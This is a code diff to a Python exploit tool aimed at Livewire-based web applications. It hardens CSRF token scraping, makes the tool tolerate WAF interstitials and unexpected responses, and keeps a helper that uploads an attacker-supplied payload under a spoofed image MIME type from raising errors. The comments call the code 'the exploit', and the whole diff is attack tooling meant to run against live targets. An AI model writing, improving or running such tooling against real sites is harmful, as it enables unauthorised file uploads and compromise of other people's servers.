@@ -77,10 +77,18 @@ def resolve_csrf(session: requests.Session, body: str) -> Tuple[Optional[str], O
 
     Sending the wrong header name yields a 419, so callers must carry all three through.
     """
-    m = re.search(r'name="csrf-token"\s+content="([^"]+)"', body)
-    if m:
-        token = html.unescape(m.group(1))
-        return "X-CSRF-TOKEN", token, token
+    # Order-independent: real markup emits the attributes in either order
+    # (name="csrf-token" content="..."  OR  content="..." name="csrf-token"), often
+    # with extra attributes/newlines between them. Match the <meta> tag, then pull
+    # whichever attribute order it used.
+    meta = re.search(r'<meta\b[^>]*\bname=["\']csrf-token["\'][^>]*>', body, re.IGNORECASE) \
+        or re.search(r'<meta\b[^>]*\bcontent=["\'][^"\']+["\'][^>]*\bname=["\']csrf-token["\'][^>]*>',
+                     body, re.IGNORECASE)
+    if meta:
+        cm = re.search(r'content=["\']([^"\']+)["\']', meta.group(0), re.IGNORECASE)
+        if cm:
+            token = html.unescape(cm.group(1))
+            return "X-CSRF-TOKEN", token, token
     m = re.search(r'"csrfToken"\s*:\s*"([^"]+)"', body)
     if m:
         token = m.group(1)
@@ -159,9 +167,18 @@ def livewire_update(session, update_url, component, calls, updates=None,
         if tolerate_500:
             return None, {}, r.status_code
         raise requests.RequestException(f"{update_url} -> HTTP {r.status_code}: {r.text[:200]}")
-    data = r.json()
-    comp = data["components"][0]
-    return comp["snapshot"], comp.get("effects", {}), r.status_code
+    # A 200 that is not the expected Livewire envelope (WAF interstitial, HTML error,
+    # shape change) must not crash the exploit with KeyError/IndexError — convert it to
+    # a controlled RequestException the callers already handle.
+    try:
+        comp = r.json()["components"][0]
+        snapshot = comp["snapshot"]
+    except (ValueError, KeyError, IndexError, TypeError) as e:
+        if tolerate_500:
+            return None, {}, r.status_code
+        raise requests.RequestException(
+            f"{update_url} -> 200 but not a Livewire response ({type(e).__name__}): {r.text[:200]}")
+    return snapshot, comp.get("effects", {}), r.status_code
 
 
 def snapshot_model_key(snapshot: str, prop: str = "currentFolder"):
@@ -225,12 +242,18 @@ def lw3_upload(session, component, *, prop, filename, payload, mime="image/png",
     """
     comp = LivewireComponent(component)
 
-    snap, effects, _ = livewire_update(
-        session, comp["update_url"], comp,
-        calls=[{"path": "", "method": "_startUpload",
-                "params": [prop, [{"name": filename, "size": len(payload), "type": mime}], is_multiple]}],
-        timeout=timeout,
-    )
+    # _startUpload can fail (non-200 / non-Livewire 200) on a WAF or shape change. The
+    # contract here is "couldn't park the file" -> UploadResult(False, ...), NOT an
+    # exception bubbling out to callers that expected a result object.
+    try:
+        snap, effects, _ = livewire_update(
+            session, comp["update_url"], comp,
+            calls=[{"path": "", "method": "_startUpload",
+                    "params": [prop, [{"name": filename, "size": len(payload), "type": mime}], is_multiple]}],
+            timeout=timeout,
+        )
+    except requests.RequestException:
+        return UploadResult(False, None, {})
     comp["snapshot"] = snap
 
     signed_url = _signed_url_from_effects(effects, comp["page_url"])
